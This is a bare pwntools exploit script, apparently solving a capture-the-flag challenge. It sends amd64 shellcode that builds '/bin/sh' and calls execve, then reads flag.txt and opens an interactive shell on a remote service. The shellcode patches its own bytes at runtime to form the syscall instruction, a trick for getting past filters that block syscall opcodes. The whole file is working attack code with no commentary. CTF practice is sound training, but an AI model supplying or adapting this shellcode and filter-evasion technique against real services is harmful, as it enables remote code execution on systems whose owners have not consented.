#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'shell_1'
HOST = '103.77.175.40'
PORT = 6071
context.arch = 'amd64'

exe = ELF(exe_path, checksec=False)
context.binary = exe

gdbscript = '''
break *main
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

shellcode_asm = '''
    mov rax, 59
    mov rbx, 29400045130965551 
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    lea rcx, [rip + skip] 
    inc byte ptr [rcx]

    .byte 0x0f
skip:
    .byte 0x04
'''
shellcode = asm(shellcode_asm)

payload = shellcode.ljust(256, b'\x90')

p.sendafter(b'Enter your shellcode (max 256 bytes):\n', payload)

p.sendline(b'cat flag.txt')

p.interactive()